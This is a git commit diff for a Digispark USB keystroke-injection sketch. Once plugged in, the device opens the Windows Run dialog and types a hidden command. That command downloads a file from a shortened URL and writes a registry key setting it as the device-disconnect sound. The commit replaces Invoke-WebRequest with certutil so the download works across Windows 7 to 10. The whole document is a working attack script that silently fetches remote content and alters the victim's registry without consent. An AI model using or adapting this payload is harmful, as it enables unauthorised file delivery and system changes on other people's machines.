a23d53f9fa714f68529797ac64cec452a99e12f8
Darkprince <30362337+sridharas04@users.noreply.github.com>
2019-11-12 11:30:26 +0530

    Added Full windows support.
    Now it works from windows 7 to windows 10.

--- digispark_script.ino
+++ digispark_script.ino
@@ -4,7 +4,7 @@ void setup() { //execute once
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd /C start /MIN cmd /C powershell Invoke-WebRequest 'http://bit.do/loud0' -Outfile '%temp%/s.wav';reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
+  DigiKeyboard.print("cmd /C start /MIN cmd /C powershell certutil -urlcache -split -f 'http://bit.do/loud0' $env:temp/s.wav;reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\DeviceDisconnect\\.Current\\ /t REG_SZ /d  $env:temp/s.wav /f");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
 }
